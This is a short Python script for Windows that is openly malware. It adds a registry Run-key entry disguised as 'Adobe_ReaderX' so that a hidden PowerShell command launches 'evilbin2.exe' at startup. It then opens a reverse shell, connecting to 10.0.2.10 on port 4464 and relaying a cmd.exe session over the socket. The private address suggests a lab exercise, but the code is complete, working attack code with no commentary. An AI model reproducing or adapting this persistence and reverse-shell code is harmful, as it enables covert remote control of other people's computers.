import os,socket,subprocess,threading;
from _winreg import *

def autorun(tempdir, filename, run):
    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey = []
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass

    if 'Adobe ReaderX' not in runkey:
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
            SetValueEx(key, 'Adobe_ReaderX',0,REG_SZ, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden \"Start-Process -WindowStyle hidden -FilePath C:\\Users\\Dustin\\dist\\evilbin2.exe\"")
            key.Close()
        except WindowsError:
            pass
        
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

tempdir = '%TEMP%'
filename = "evilbin2.exe"
run = "Software\Microsoft\Windows\CurrentVersion\Run"
autorun(tempdir, filename, run)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.10",4464))
# p=subprocess.Popen(["\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

p=subprocess.Popen(["\\Windows\\System32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
